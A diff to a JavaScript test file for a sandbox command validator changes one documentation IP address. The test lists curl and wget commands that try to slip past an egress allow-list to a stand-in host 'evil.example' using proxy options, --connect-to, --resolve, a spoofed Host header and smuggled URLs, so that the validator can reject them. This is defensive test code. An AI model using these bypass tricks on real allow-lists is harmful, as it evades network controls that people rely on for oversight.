@@ -479,7 +479,7 @@ test('the run markers are protected; only a sole rm of the run\'s own marker pas
 
 test('with an egress allow-list curl and wget take only literal URLs on listed hosts and no redirecting option', () => {
   const c = { ...ctx, allowedHosts: ['localhost', '127.0.0.1'] };
-  for (const cmd of ['curl http://localhost/ evil.example/x', 'curl --connect-to localhost:80:evil.example:80 http://localhost/', 'curl --resolve localhost:80:203.0.113.5 http://localhost/',
+  for (const cmd of ['curl http://localhost/ evil.example/x', 'curl --connect-to localhost:80:evil.example:80 http://localhost/', 'curl --resolve localhost:80:192.0.2.5 http://localhost/',
     'curl -x evil.example:8080 http://localhost/', 'curl -sx evil.example:8080 http://localhost/', 'curl --proxy=evil.example:8080 http://localhost/', 'curl --socks5-hostname evil.example http://localhost/',
     'curl -H "Host: evil.example" http://localhost/', 'curl --url evil.example/x http://localhost/', 'curl http://localhost\@evil.example/', 'curl "http://localhost/ evil.example"',
     'wget -e http_proxy=evil.example:8080 -q -O - http://localhost/', 'wget -q -O - http://localhost/ evil.example/x']) {
